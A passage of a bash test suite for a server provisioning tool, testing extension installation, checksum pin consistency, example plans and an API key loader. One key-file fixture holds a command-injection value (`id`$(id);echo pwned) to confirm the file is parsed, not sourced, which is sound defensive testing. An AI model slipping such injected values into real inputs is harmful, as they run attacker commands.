        || bad "local archive cleanup in a mixed plan"
else
    ok "remote provision integration skipped without root"
fi

section "VS Code extension helper"
VSCODE_FIX="$TMP/vscode"; mkdir -p "$VSCODE_FIX"
cat > "$VSCODE_FIX/code" <<'FAKECODE'
#!/usr/bin/env bash
set -e
case "$1" in
  --list-extensions) printf '%s\n' 'publisher.already' ;;
  --install-extension) printf '%s\n' "$2" >> "$VSCODE_INSTALL_LOG" ;;
  *) exit 2 ;;
esac
FAKECODE
chmod +x "$VSCODE_FIX/code"
cat > "$VSCODE_FIX/extensions.txt" <<'EXT'
publisher.already
publisher.missing
EXT
if VSCODE_INSTALL_LOG="$VSCODE_FIX/install.log" STATE_ROOT="$VSCODE_FIX/state" LOG_ROOT="$VSCODE_FIX/log" \
    ./server-vscode-extensions --cli "$VSCODE_FIX/code" --manifest "$VSCODE_FIX/extensions.txt" >/dev/null \
    && [[ "$(cat "$VSCODE_FIX/install.log")" == publisher.missing ]]; then
    ok "helper installs only missing extensions"
else bad "VS Code helper idempotence"; fi
if STATE_ROOT="$VSCODE_FIX/no-cli-state" LOG_ROOT="$VSCODE_FIX/no-cli-log" \
    VSCODE_CLI=/does/not/exist ./server-vscode-extensions --manifest "$VSCODE_FIX/extensions.txt" >/dev/null 2>&1; then
    bad "missing explicit VS Code CLI accepted"
else ok "missing explicit VS Code CLI rejected"; fi
cat > "$VSCODE_FIX/code-partial" <<'FAKEPARTIAL'
#!/usr/bin/env bash
set -e
case "$1" in
  --list-extensions) exit 0 ;;
  --install-extension)
    printf '%s
' "$2" >> "$VSCODE_INSTALL_LOG"
    [[ "$2" != publisher.fail ]]
    ;;
  *) exit 2 ;;
esac
FAKEPARTIAL
chmod +x "$VSCODE_FIX/code-partial"
cat > "$VSCODE_FIX/extensions-partial.txt" <<'EXTPARTIAL'
publisher.fail
publisher.after
EXTPARTIAL
partial_rc=0
VSCODE_INSTALL_LOG="$VSCODE_FIX/partial.log" STATE_ROOT="$VSCODE_FIX/partial-state" LOG_ROOT="$VSCODE_FIX/partial-logs" \
    ./server-vscode-extensions --cli "$VSCODE_FIX/code-partial" --manifest "$VSCODE_FIX/extensions-partial.txt" >/dev/null 2>&1 || partial_rc=$?
if [[ "$partial_rc" == 4 && "$(cat "$VSCODE_FIX/partial.log")" == $'publisher.fail
publisher.after' ]]; then
    ok "helper continues after an extension failure"
else bad "VS Code helper partial-failure behavior"; fi

section "Acceptance test is accelerator-optional"
# A CPU-only host is a valid configuration. Absent nvidia-smi must be a note,
# not a rejection, unless the declared specification requires a GPU.
ACCEPT_FIX="$TMP/accept"; mkdir -p "$ACCEPT_FIX"
if PATH=/usr/bin:/bin command -v nvidia-smi >/dev/null 2>&1; then
    ok "accelerator-absent path skipped (this machine has nvidia-smi)"
else
    accept_rc=0
    accept_json="$(PATH=/usr/bin:/bin MIN_DISK_GB=0 MIN_DISK_MBPS=0 WORKSPACE_ROOT="$ACCEPT_FIX" \
        ./server-accept.sh --json)" || accept_rc=$?
    if [[ "$accept_rc" == 0 ]] && grep -q '"level":"ok","check":"accelerator"' <<<"$accept_json"; then
        ok "machine with no GPU is accepted by default"
    else bad "no-GPU acceptance (exit $accept_rc)"; fi

    accept_rc=0
    accept_json="$(PATH=/usr/bin:/bin REQUIRE_ACCELERATOR=1 MIN_DISK_GB=0 MIN_DISK_MBPS=0 WORKSPACE_ROOT="$ACCEPT_FIX" \
        ./server-accept.sh --json)" || accept_rc=$?
    if [[ "$accept_rc" == 1 ]] && grep -q '"level":"reject","check":"accelerator"' <<<"$accept_json"; then
        ok "REQUIRE_ACCELERATOR=1 rejects a machine with no GPU"
    else bad "REQUIRE_ACCELERATOR rejection (exit $accept_rc)"; fi
fi

section "Configuration and documentation"
grep -q 'UV_SHA256_X64="${UV_SHA256_X64:-[0-9a-fA-F]\{64\}}"' lib/bootstrap/config.sh \
    && grep -q 'UV_SHA256_ARM64="${UV_SHA256_ARM64:-[0-9a-fA-F]\{64\}}"' lib/bootstrap/config.sh \
    && ok "uv checksum pinned for both architectures" || bad "uv checksum default"
# Shape only, here and below. The values themselves are checked against every
# other surface that records them by tools/check-pins.sh, exercised in its own
# section further down. Literal versions and checksums used to live in this
# file for Node.js, Claude Code and Codex: they caught a wrong value, but they
# also failed a correct coordinated bump until somebody hand-edited this file,
# and they left uv, gh and Oh My Zsh with no value check at all. See #23.
grep -q 'INSTALL_NODEJS="${INSTALL_NODEJS:-1}"' lib/bootstrap/config.sh \
    && grep -Eq 'NODE_VERSION="\$\{NODE_VERSION:-[0-9]+\.[0-9]+\.[0-9]+\}"' lib/bootstrap/config.sh \
    && grep -Eq 'NODE_SHA256_X64="\$\{NODE_SHA256_X64:-[0-9a-fA-F]{64}\}"' lib/bootstrap/config.sh \
    && grep -Eq 'NODE_SHA256_ARM64="\$\{NODE_SHA256_ARM64:-[0-9a-fA-F]{64}\}"' lib/bootstrap/config.sh \
    && ok "Node.js LTS is enabled and checksum pinned" || bad "Node.js defaults/checksums"
grep -q 'INSTALL_CLAUDE_CODE="${INSTALL_CLAUDE_CODE:-1}"' lib/bootstrap/config.sh \
    && grep -Eq 'CLAUDE_CODE_VERSION="\$\{CLAUDE_CODE_VERSION:-[0-9]+\.[0-9]+\.[0-9]+\}"' lib/bootstrap/config.sh \
    && grep -q '@anthropic-ai/claude-code@' lib/bootstrap/ai_cli.sh \
    && grep -q 'CLAUDE_CODE_DISABLE_AUTOUPDATER="${CLAUDE_CODE_DISABLE_AUTOUPDATER:-1}"' lib/bootstrap/config.sh \
    && grep -q 'export DISABLE_AUTOUPDATER=1' lib/bootstrap/ai_cli.sh \
    && ok "Claude Code is enabled, pinned, and update-controlled" || bad "Claude Code defaults/pin"
grep -q 'INSTALL_CODEX="${INSTALL_CODEX:-1}"' lib/bootstrap/config.sh \
    && grep -Eq 'CODEX_VERSION="\$\{CODEX_VERSION:-[0-9]+\.[0-9]+\.[0-9]+\}"' lib/bootstrap/config.sh \
    && grep -q '@openai/codex@' lib/bootstrap/ai_cli.sh \
    && ok "Codex is enabled and version pinned" || bad "Codex defaults/pin"
grep -q 'INSTALL_VSCODE_EXTENSIONS="${INSTALL_VSCODE_EXTENSIONS:-1}"' lib/bootstrap/config.sh \
    && grep -q 'server-vscode-extensions --auto' lib/bootstrap/shell.sh \
    && [[ "$(awk 'NF && $1 !~ /^#/ {n++} END{print n}' config/vscode-extensions.txt)" == 49 ]] \
    && grep -q 'server-vscode-extensions" "$stage/server-vscode-extensions' lib/bootstrap/runtime.sh \
    && grep -q 'config/vscode-extensions.txt" "$stage/config/vscode-extensions.txt' lib/bootstrap/runtime.sh \
    && ok "VS Code extension manifest and deferred installer" || bad "VS Code extension configuration"
awk 'NF && $1 !~ /^#/ {print tolower($1)}' config/vscode-extensions.txt | grep -Eqv '^[a-z0-9][a-z0-9-]*\.[a-z0-9][a-z0-9._-]*$' \
    && bad "invalid VS Code extension ID" || ok "VS Code extension IDs are valid"
[[ "$(awk 'NF && $1 !~ /^#/ {print tolower($1)}' config/vscode-extensions.txt | sort | uniq -d | wc -l)" == 0 ]] \
    && ok "VS Code extension IDs are unique" || bad "duplicate VS Code extension IDs"

grep -q 'INSTALL_GITHUB_CLI="${INSTALL_GITHUB_CLI:-1}"' lib/bootstrap/config.sh \
    && grep -Eq 'GH_VERSION="\$\{GH_VERSION:-[0-9]+\.[0-9]+\.[0-9]+\}"' lib/bootstrap/config.sh \
    && grep -Eq 'GH_SHA256_X64="\$\{GH_SHA256_X64:-[0-9a-fA-F]{64}\}"' lib/bootstrap/config.sh \
    && grep -Eq 'GH_SHA256_ARM64="\$\{GH_SHA256_ARM64:-[0-9a-fA-F]{64}\}"' lib/bootstrap/config.sh \
    && grep -q 'github.com/cli/cli/releases/download' lib/bootstrap/github_cli.sh \
    && ok "GitHub CLI is enabled and checksum pinned" || bad "GitHub CLI defaults/checksums"
# gh ships as a verified tarball, so it must never also be an apt package name:
# two installers for one binary is how a pinned version silently regresses.
grep -Eq '^gh$' config/packages.txt \
    && bad "gh must be installed from the pinned release, not apt" \
    || ok "gh is not duplicated in the apt manifest"

grep -q 'INSTALL_ZSH="${INSTALL_ZSH:-1}"' lib/bootstrap/config.sh \
    && grep -Eq '^zsh$' config/packages.txt && grep -Eq '^ffmpeg$' config/packages.txt \
    && ok "Zsh installed by default" || bad "Zsh package/default"
grep -q 'INSTALL_OH_MY_ZSH="${INSTALL_OH_MY_ZSH:-1}"' lib/bootstrap/config.sh \
    && grep -Eq 'OH_MY_ZSH_REF="\$\{OH_MY_ZSH_REF:-[0-9a-fA-F]{40}\}"' lib/bootstrap/config.sh \
    && ok "Oh My Zsh enabled and pinned" || bad "Oh My Zsh default/pin"
grep -q "alias c='clear'" lib/bootstrap/shell.sh \
    && grep -q 'source "\$ZSH/oh-my-zsh.sh"' lib/bootstrap/shell.sh \
    && ok "Oh My Zsh startup and clear alias" || bad "shell startup/clear alias"
grep -q 'bootstrap_set_default_zsh' lib/bootstrap/shell.sh \
    && grep -q 'usermod --shell' lib/bootstrap/shell.sh \
    && ok "Zsh login shell enforcement" || bad "Zsh default shell enforcement"
for doc in QUICKSTART PROVISIONING ARCHITECTURE BUNDLE-CONTRACT CONFIGURATION TROUBLESHOOTING SECURITY-SCANNING ML-PROFILE; do
    [[ -s "docs/$doc.md" ]] && ok "documentation: $doc" || bad "missing documentation: $doc"
done

section "Fitness: every pinned value agrees on every surface that records it"
# lib/bootstrap/config.sh is canonical. config.example.env, checksums/*.txt,
# README.md and docs/CONFIGURATION.md are second recordings of the same
# sixteen values, and tools/refresh-pins.sh --write writes all of them.
# tools/check-pins.sh asserts each recording is present exactly once, is well
# formed, and equals the canonical value -- with every architecture anchored to
# its own label, so an x64/arm64 swap fails. Before it existed a zeroed uv
# checksum, a swapped pair, and a two-release-stale docs/CONFIGURATION.md all
# passed this suite. See #23.
#
# Not a security boundary: anyone who can edit config.sh can edit this file.
# A wrong checksum fails closed at install time. This makes it visible in CI.
check_pins_out="$(bash tools/check-pins.sh 2>&1)" \
    && ok "every pinned value agrees on every surface" \
    || bad "check-pins: $check_pins_out"

# The adversarial half. Each case copies the pin surfaces into a scratch tree,
# mutates one, and runs the real checker against it, so the tests exercise the
# shipped code rather than a paraphrase of it -- and the working tree is never
# touched. Each asserts the specific finding, not merely a non-zero exit: a
# checker that failed for some unrelated reason would otherwise look covered.
pin_surface_copy() {
    local dest file
    dest="$(mktemp -d "$TMP/pins.XXXXXX")"
    for file in VERSION README.md config.example.env lib/bootstrap/config.sh \
        docs/CONFIGURATION.md checksums/NODE_SHA256.txt checksums/GH_SHA256.txt \
        checksums/NGROK_SHA256.txt checksums/UV_SHA256.txt checksums/OH_MY_ZSH_REF.txt \
        checksums/AI_CLI_VERSIONS.txt examples/provision-plan.example.sh \
        examples/provision-plan.whisper.example.sh; do
        mkdir -p "$dest/$(dirname "$file")"
        cp -- "$file" "$dest/$file"
    done
    printf '%s\n' "$dest"
}
pin_reject() {  # label, expected finding fragment, root
    local label="$1" fragment="$2" root="$3" out
    if out="$(bash tools/check-pins.sh "$root" 2>&1)"; then
        bad "check-pins accepted $label"
        return
    fi
    grep -qF -- "$fragment" <<< "$out" \
        && ok "check-pins rejects $label" \
        || bad "check-pins rejected $label, but not for '$fragment': $out"
}

ZERO64=0000000000000000000000000000000000000000000000000000000000000000

# A wrong checksum, in either recording.
root="$(pin_surface_copy)"
sed -i "s|UV_SHA256_X64:-[0-9a-f]\{64\}|UV_SHA256_X64:-$ZERO64|" "$root/lib/bootstrap/config.sh"
pin_reject "a zeroed uv checksum in config.sh" "UV_SHA256_X64" "$root"

root="$(pin_surface_copy)"
sed -i "s|^x86_64-unknown-linux-gnu  [0-9a-f]\{64\}$|x86_64-unknown-linux-gnu  $ZERO64|" "$root/checksums/UV_SHA256.txt"
pin_reject "a zeroed uv checksum in the manifest" \
    "mismatch: checksums/UV_SHA256.txt records $ZERO64 for UV_SHA256_X64" "$root"

# The case grep -qF cannot see: both values are still present in the file, just
# recorded against the wrong architecture.
for pair in \
    'checksums/UV_SHA256.txt|x86_64-unknown-linux-gnu|aarch64-unknown-linux-gnu' \
    'checksums/NODE_SHA256.txt|linux-x64|linux-arm64' \
    'checksums/GH_SHA256.txt|linux-amd64|linux-arm64' \
    'checksums/NGROK_SHA256.txt|linux-amd64|linux-arm64'; do
    IFS='|' read -r file x64_label arm_label <<< "$pair"
    root="$(pin_surface_copy)"
    python3 - "$root/$file" "$x64_label" "$arm_label" <<'SWAP'
import re, sys
path, x64_label, arm_label = sys.argv[1:4]
text = open(path).read()
grab = lambda label: re.search(r'^%s( +)([0-9a-f]{64})$' % re.escape(label), text, re.M)
a, b = grab(x64_label), grab(arm_label)
text = text[:a.start(2)] + b.group(2) + text[a.end(2):]
b = grab(arm_label)
text = text[:b.start(2)] + a.group(2) + text[b.end(2):]
open(path, 'w').write(text)
SWAP
    pin_reject "x64 and arm64 swapped in $file" "mismatch: $file" "$root"
done

# One-sided bumps, in each direction and on each surface.
root="$(pin_surface_copy)"
sed -i 's|NODE_VERSION:-[0-9.]*|NODE_VERSION:-99.0.0|' "$root/lib/bootstrap/config.sh"
pin_reject "a config-only Node.js bump" "for NODE_VERSION" "$root"

root="$(pin_surface_copy)"
sed -i 's|^@anthropic-ai/claude-code .*|@anthropic-ai/claude-code 99.0.0|' "$root/checksums/AI_CLI_VERSIONS.txt"
pin_reject "a manifest-only Claude Code bump" \
    "mismatch: checksums/AI_CLI_VERSIONS.txt records 99.0.0 for CLAUDE_CODE_VERSION" "$root"

root="$(pin_surface_copy)"
sed -i 's|^# UV_VERSION=.*|# UV_VERSION=0.0.1|' "$root/config.example.env"
pin_reject "a stale config.example.env" "mismatch: config.example.env" "$root"

root="$(pin_surface_copy)"
sed -i 's|^CLAUDE_CODE_VERSION=.*|CLAUDE_CODE_VERSION=0.0.1|' "$root/docs/CONFIGURATION.md"
pin_reject "a stale docs/CONFIGURATION.md" "mismatch: docs/CONFIGURATION.md" "$root"

root="$(pin_surface_copy)"
sed -i 's|Claude Code [0-9][0-9.]*|Claude Code 0.0.1|' "$root/README.md"
pin_reject "a stale README.md" "mismatch: README.md" "$root"

# The example plans: a plan is sourced before the bootstrap runs, so a pin here
# beats the bundle default. Both shipped plans carried a uv override that spent
# two releases stale, which meant the documented quick start installed uv
# 0.12.12 against a bundle pinned to 0.12.13.
root="$(pin_surface_copy)"
printf 'export UV_VERSION=0.12.12\n' >> "$root/examples/provision-plan.example.sh"
pin_reject "a re-added example-plan pin override" \
    "unlabelled pin override: examples/provision-plan.example.sh sets UV_VERSION" "$root"

# Extra, missing, duplicate and malformed recordings.
root="$(pin_surface_copy)"
printf 'riscv64-unknown-linux-gnu %s\n' "$ZERO64" >> "$root/checksums/UV_SHA256.txt"
pin_reject "an unclaimed extra hash in a manifest" \
    "unclaimed hash in checksums/UV_SHA256.txt" "$root"

root="$(pin_surface_copy)"
sed -i '/^# UV_VERSION=/d' "$root/config.example.env"
pin_reject "a recording deleted from config.example.env" \
    "missing or malformed: UV_VERSION in config.example.env" "$root"

root="$(pin_surface_copy)"
sed -n 's|^\(# PI_VERSION=.*\)$|\1|p' "$root/config.example.env" >> "$root/config.example.env"
pin_reject "a duplicated recording" "duplicate: PI_VERSION" "$root"

root="$(pin_surface_copy)"
sed -i 's|OH_MY_ZSH_REF:-\([0-9a-f]\{39\}\)[0-9a-f]|OH_MY_ZSH_REF:-\1|' "$root/lib/bootstrap/config.sh"
pin_reject "a ref truncated to 39 hex characters" \
    "missing or malformed: OH_MY_ZSH_REF in lib/bootstrap/config.sh" "$root"

root="$(pin_surface_copy)"
sed -i 's|^\( *\)GH_VERSION=|\1RUSTUP_VERSION="${RUSTUP_VERSION:-1.2.3}"\n\1GH_VERSION=|' "$root/lib/bootstrap/config.sh"
pin_reject "a new pin with no map entry" "unmapped pin: RUSTUP_VERSION" "$root"

# And the case the whole design exists for: a full coordinated bump, applied by
# the same writer refresh-pins.sh --write uses, must pass with no hand edit to
# any test file.
root="$(pin_surface_copy)"
if SB_PIN_ROOT="$root" \
    NODE_VERSION=25.1.0 NODE_SHA256_X64="${ZERO64/00/a1}" NODE_SHA256_ARM64="${ZERO64/00/a2}" \
    GH_VERSION=99.99.99 GH_SHA256_X64="${ZERO64/00/b1}" GH_SHA256_ARM64="${ZERO64/00/b2}" \
    UV_VERSION=0.13.0 UV_SHA256_X64="${ZERO64/00/c1}" UV_SHA256_ARM64="${ZERO64/00/c2}" \
    NGROK_VERSION=4.0.0 NGROK_SHA256_X64="${ZERO64/00/d1}" NGROK_SHA256_ARM64="${ZERO64/00/d2}" \
    CLAUDE_CODE_VERSION=2.2.0 CODEX_VERSION=0.155.0 PI_VERSION=0.86.0 \
    OH_MY_ZSH_REF=1111111111111111111111111111111111111111 OMZ_DATE=2026-01-01 \
    python3 tools/write-pins.py >/dev/null 2>&1; then
    bash tools/check-pins.sh "$root" >/dev/null 2>&1 \
        && ok "a coordinated bump passes with no hand-edited test literal" \
        || bad "a coordinated bump written by tools/write-pins.py fails check-pins"
else
    bad "tools/write-pins.py could not apply a coordinated bump"
fi

# The reverse regression: no pin literal may creep back into this file. The
# only 40/64-hex strings allowed are the synthetic fixture that drives
# sb_sha256_from_manifest_body parsing, which is parser input and would keep
# parsing correctly if it went stale, and the all-zero probe above.
pin_literal_drift=0
while IFS= read -r hit; do
    [[ -n "$hit" ]] || continue
    bad "pin literal back in tests/run-tests.sh: $hit"
    pin_literal_drift=1
done < <(grep -noE '\b[0-9a-f]{40}\b|\b[0-9a-f]{64}\b' tests/run-tests.sh \
    | grep -vE ':(0{40}|0{64}|1{40})$' \
    | grep -vE ':(fd8e59d5a511510f6a298afb548f18c7d2b1be404d8b4a27d94fbe49f56cb2d6|6ad1325edbdb5649c379b75a237147a666c95d4f9ae8d340fef2d1575d289ad2|ab9b309d4586403f024e100abaceb396616e178a553e2500c36087d180f09509)$' \
    || true)
(( pin_literal_drift == 0 )) && ok "no pin literal in tests/run-tests.sh outside the parser fixture"

section "Fitness: example plans are safe to copy and paste"
# A plan carries a shebang and the executable bit, so it looks runnable. It is
# not: register_bootstrap only exists while server-provision.sh sources it. Running
# one used to emit 'command not found' twice and exit 127.
plan_guard_drift=0
for plan in examples/provision-plan*.sh; do
    grep -q 'declare -F register_bootstrap' "$plan" \
        || { bad "no direct-execution guard: $plan"; plan_guard_drift=1; continue; }
    guard_out="$(bash "$plan" 2>&1)"; guard_code=$?
    [[ "$guard_code" == 2 ]] \
        || { bad "$plan exited $guard_code when run directly, expected 2"; plan_guard_drift=1; }
    grep -qF -- '--plan' <<< "$guard_out" \
        || { bad "$plan guard does not name the correct command"; plan_guard_drift=1; }
done
(( plan_guard_drift == 0 )) && ok "example plans reject direct execution"

# The quick-start plan must install the foundation only. An active
# register_bundle naming an archive that ships nowhere aborts provisioning
# after the bootstrap has already installed, reporting FAILED on a host that
# was in fact provisioned.
if grep -qE '^[[:space:]]*register_bundle' examples/provision-plan.example.sh; then
    bad "provision-plan.example.sh registers a bundle; quick start would fail"
else
    ok "default example plan registers no unavailable bundle"
fi

# The README must send people through server-provision.sh, never at a plan file.
if grep -qE '^[[:space:]]*(sudo )?\./provision-plan[^[:space:]]*\.sh' README.md; then
    bad "README invokes a plan file directly"
elif grep -q 'server-provision.sh --plan' README.md; then
    ok "README quick start uses server-provision.sh --plan"
else
    bad "README quick start does not show server-provision.sh --plan"
fi

section "Fitness: README tables only name commands bootstrap actually installs"
# The Quick Reference table told people to run `server-provision.sh --plan …
# --dry-run` after install, but bootstrap_install_runtime_tools() only ever
# symlinks the bare `server-provision` onto PATH (the .sh suffix is not
# stripped uniformly — server-accept is the sole exception, keeping both
# names). Following the doc literally failed with 'command not found' (127).
# The installed-command set is derived from lib/bootstrap/runtime.sh itself,
# not hardcoded here, so this stays a docs-vs-reality check, not a snapshot.
declare -A installed_commands=()
while IFS= read -r name; do
    [[ -n "$name" ]] && installed_commands["$name"]=1
done < <(grep -oE '/usr/local/bin/[A-Za-z0-9_.-]+' lib/bootstrap/runtime.sh | sed 's#.*/##' | sort -u)

readme_cmd_drift=0
while IFS= read -r token; do
    [[ -n "$token" ]] || continue
    [[ "$token" == server-* ]] || continue
    [[ -n "${installed_commands[$token]:-}" ]] \
        || { bad "README table names '$token', which runtime.sh never symlinks onto PATH"; readme_cmd_drift=1; }
done < <(grep '^|' README.md | grep -oE '`[^`]+`' | sed -E 's/^`//; s/`$//' | awk '{print $1}')
(( readme_cmd_drift == 0 )) && ok "README command tables match commands bootstrap installs"

section "API key file: parsing"
# One fixture drives every parsing rule. The point of most of these cases is
# that the file is parsed, not sourced.
KEYS_FIXTURE="$TMP/secrets.env"
cat > "$KEYS_FIXTURE" <<'FIXTURE'
# a comment
ANTHROPIC_API_KEY=fixture-anthropic-value-1234
   # an indented comment

  OPENAI_API_KEY = name-with-space-is-invalid
OPENAI_API_KEY=fixture-openai-value-9c11
export OPENROUTER_API_KEY=fixture-openrouter-value-4de0
DOUBLE_QUOTED="fixture-double-quoted"
SINGLE_QUOTED='fixture-single-quoted'
EMPTY_KEY=
INJECTED=`id`$(id);echo pwned
WITH_EQUALS=a=b=c
TRAILING=fixture-with-trailing-space   
9BADNAME=x
BAD-NAME=y
no_equals_line
FIXTURE
chmod 600 "$KEYS_FIXTURE"

keys_probe() {
    # A subshell so exported fixture values never reach the rest of the suite.
    ( set +u
      # shellcheck source=/dev/null
      . ./lib/secrets-load.sh
      server_secrets_load "$KEYS_FIXTURE" >/dev/null 2>&1
      eval "printf '%s' \"\${$1-__UNSET__}\"" )
}

[[ "$(keys_probe ANTHROPIC_API_KEY)" == 'fixture-anthropic-value-1234' ]] \
    && ok "plain KEY=VALUE is exported" || bad "plain KEY=VALUE"
[[ "$(keys_probe OPENROUTER_API_KEY)" == 'fixture-openrouter-value-4de0' ]] \
    && ok "an export prefix is stripped" || bad "export prefix handling"
[[ "$(keys_probe DOUBLE_QUOTED)" == 'fixture-double-quoted' ]] \
    && ok "double quotes are stripped" || bad "double-quote handling"
[[ "$(keys_probe SINGLE_QUOTED)" == 'fixture-single-quoted' ]] \
    && ok "single quotes are stripped" || bad "single-quote handling"
[[ "$(keys_probe WITH_EQUALS)" == 'a=b=c' ]] \
    && ok "only the first = splits the line" || bad "value containing ="
[[ "$(keys_probe TRAILING)" == 'fixture-with-trailing-space' ]] \
    && ok "trailing whitespace is trimmed" || bad "trailing whitespace"
[[ "$(keys_probe EMPTY_KEY)" == '__UNSET__' ]] \
    && ok "an empty value is not exported" || bad "empty value was exported"
# Probed through the loaded-name list: "9BADNAME" is not a valid parameter
# name, so ${9BADNAME-...} would be a syntax error rather than a test.
loaded_names="$( set +u
    # shellcheck source=/dev/null
    . ./lib/secrets-load.sh
    server_secrets_load "$KEYS_FIXTURE" >/dev/null 2>&1
    printf ' %s ' "$SERVER_SECRETS_LOADED" )"
[[ "$loaded_names" != *' 9BADNAME '* \
    && "$loaded_names" != *' BAD-NAME '* \
    && "$loaded_names" != *' no_equals_line '* \
    && "$loaded_names" == *' ANTHROPIC_API_KEY '* ]] \
    && ok "invalid names and non-assignments are skipped" || bad "invalid line handling"
# The decisive one: command substitution in a value must survive as text.
[[ "$(keys_probe INJECTED)" == '`id`$(id);echo pwned' ]] \
    && ok "the keys file is parsed, not sourced" || bad "value was evaluated instead of parsed"

# The generated loader must behave identically in the shell that actually runs
# it. Zsh does not word-split unquoted expansions, which is easy to get wrong.
if command -v zsh >/dev/null 2>&1; then
    zsh_probe="$(zsh -c '
        . ./lib/secrets-load.sh
        server_secrets_load "'"$KEYS_FIXTURE"'" >/dev/null 2>&1
        printf "%s|%s" "$ANTHROPIC_API_KEY" "$SERVER_SECRETS_LOADED"
        server_secrets_unload
        printf "|%s" "${ANTHROPIC_API_KEY-__UNSET__}"' 2>/dev/null)"
    [[ "$zsh_probe" == 'fixture-anthropic-value-1234|'*'|__UNSET__' ]] \
        && ok "Zsh loads and unloads the same way Bash does" || bad "Zsh parity: $zsh_probe"
else
    ok "Zsh parity skipped (zsh not installed)"
fi

mask_out="$( set +u; . ./lib/secrets-load.sh; server_secrets_mask 'fixture-anthropic-value-1234' )"
[[ "$mask_out" == 'fixture...1234' ]] \
    && ok "masking keeps only the ends" || bad "masking output: $mask_out"
[[ "$( set +u; . ./lib/secrets-load.sh; server_secrets_mask 'short' )" == '********' ]] \
    && ok "a short value is masked completely" || bad "short-value masking"

section "API key file: server-secrets"
KEYS_HOME="$TMP/keyshome"; mkdir -p "$KEYS_HOME"
export SERVER_SECRETS_FILE="$KEYS_HOME/secrets.env"

./server-secrets check >/dev/null 2>&1 \
    && bad "check passed with no keys set" || ok "check fails before any key is set"
./server-secrets init >/dev/null 2>&1 \
    && [[ -f "$SERVER_SECRETS_FILE" ]] || bad "init did not create the keys file"
[[ "$(stat -c '%a' "$SERVER_SECRETS_FILE")" == 600 ]] \
    && ok "keys file is created mode 0600" || bad "keys file mode"
[[ "$(stat -c '%a' "$KEYS_HOME")" == 700 ]] \
    && ok "keys directory is 0700" || bad "keys directory mode"

printf 'user-edit-must-survive\n' >> "$SERVER_SECRETS_FILE"
./server-secrets init >/dev/null 2>&1
grep -q 'user-edit-must-survive' "$SERVER_SECRETS_FILE" \
    && ok "init is idempotent and never clobbers an edited file" || bad "init overwrote the keys file"

printf 'suite-openrouter-value-0001\n' | ./server-secrets set OPENROUTER_API_KEY >/dev/null 2>&1
printf 'suite-openrouter-value-0002\n' | ./server-secrets set OPENROUTER_API_KEY >/dev/null 2>&1
[[ "$(grep -c '^OPENROUTER_API_KEY=' "$SERVER_SECRETS_FILE")" == 1 ]] \
    && grep -q '^OPENROUTER_API_KEY=suite-openrouter-value-0002$' "$SERVER_SECRETS_FILE" \
    && ok "set replaces in place instead of appending duplicates" || bad "set duplicate handling"
printf 'x\n' | ./server-secrets set 'BAD-NAME' >/dev/null 2>&1 \
    && bad "set accepted an invalid variable name" || ok "set rejects an invalid variable name"

# Status must describe the file, not the ambient environment: reporting an
# unrelated inherited token would leak a credential this file does not own.
GITHUB_TOKEN='ambient-value-must-not-appear' ./server-secrets status 2>/dev/null \
    | grep -q 'ambient-value-must-not-appear' \
    && bad "status leaked a value from the environment" \
    || ok "status reports the file, not the environment"
./server-secrets status 2>/dev/null | grep -q 'suite-openrouter-value-0002' \
    && bad "status printed a key in full" || ok "status never prints a key in full"
unset SERVER_SECRETS_FILE

grep -q 'server_secrets_load' lib/bootstrap/secrets.sh \
    && grep -q 'aikeys()' lib/bootstrap/secrets.sh \
    && grep -q 'server-secrets.zsh' lib/bootstrap/shell.sh \
    && ok "the generated Zsh startup file loads keys and defines aikeys" || bad "Zsh key wiring"
grep -q 'chmod 0700 "$SECRETS_DIR"' lib/bootstrap/secrets.sh \
    && grep -q 'chmod 0600 "$SECRETS_FILE"' lib/bootstrap/secrets.sh \
    && ok "bootstrap enforces key file permissions" || bad "key file permission enforcement"
# Comments may explain why not; no executable line may actually go there.
grep -v '^[[:space:]]*#' lib/bootstrap/secrets.sh | grep -q 'profile\.d' \
    && bad "keys are written to world-readable /etc/profile.d" \
    || ok "keys stay out of world-readable /etc/profile.d"
grep -Eq '^(ANTHROPIC|OPENAI|OPENROUTER)_API_KEY=$' examples/secrets.env.example \
    && ok "the shipped key template is empty" || bad "key template placeholders"
grep -Eq '^[A-Za-z_][A-Za-z0-9_]*=.+' examples/secrets.env.example \
    && bad "the shipped key template contains a value" || ok "no value is committed in the key template"

section "pi coding agent"
grep -q 'INSTALL_PI="${INSTALL_PI:-1}"' lib/bootstrap/config.sh \
    && grep -qE 'PI_VERSION="\$\{PI_VERSION:-[0-9]+\.[0-9]+\.[0-9]+\}"' lib/bootstrap/config.sh \
    && grep -q '@earendil-works/pi-coding-agent@' lib/bootstrap/ai_cli.sh \
    && ok "pi is enabled and version pinned" || bad "pi defaults/pin"
grep -q 'ln -sfn "$AI_CLI_PREFIX/bin/pi" /usr/local/bin/pi' lib/bootstrap/ai_cli.sh \
    && ok "pi is linked into /usr/local/bin" || bad "pi link"
grep -q 'PI_TELEMETRY=0' lib/bootstrap/shell.sh \
    && grep -q 'PI_SKIP_VERSION_CHECK=1' lib/bootstrap/shell.sh \
    && ok "pi telemetry and version check are disabled" || bad "pi network defaults"
python3 -m json.tool examples/pi-models.example.json >/dev/null 2>&1 \
    && ok "the pi model template is valid JSON" || bad "pi model template is not valid JSON"
grep -q '"\$OPENROUTER_API_KEY"' examples/pi-models.example.json \
    && ok "the pi model template reads the key from the environment" || bad "pi template key reference"
grep -Eq '"(apiKey|key)"[[:space:]]*:[[:space:]]*"sk-' examples/pi-models.example.json \
    && bad "the pi model template contains a literal key" || ok "no literal key in the pi model template"
grep -q 'e "$target"' lib/bootstrap/pi.sh && grep -q 'kept existing pi model configuration' lib/bootstrap/pi.sh \
    && ok "an existing models.json is never overwritten" || bad "models.json overwrite guard"

section "ngrok CLI: pinned, verified, installed only"
# ngrok is part of every bootstrap run, with no install flag and no plan step.
# The install cases run the real module against fixture packages served by a
# curl stub, with uname stubbed to choose the architecture and sleep stubbed so
# retries are instant. Nothing reaches the network and nothing is written
# outside $TMP. See #58.
grep -q '^STEP=ngrok; bootstrap_ngrok$' server-bootstrap.sh \
    && grep -q 'bootstrap/github_cli bootstrap/ngrok' server-bootstrap.sh \
    && grep -q 'lib/bootstrap/ngrok.sh' release/build-release.sh \
    && ok "the base bootstrap sources and runs the ngrok step, and the release ships it" \
    || bad "ngrok step wiring"
grep -q 'INSTALL_NGROK' lib/bootstrap/config.sh server-bootstrap.sh config.example.env docs/CONFIGURATION.md \
    && bad "ngrok has an install flag" || ok "ngrok has no install flag: every bootstrap run installs it"
grep -qi 'ngrok' examples/provision-plan*.sh \
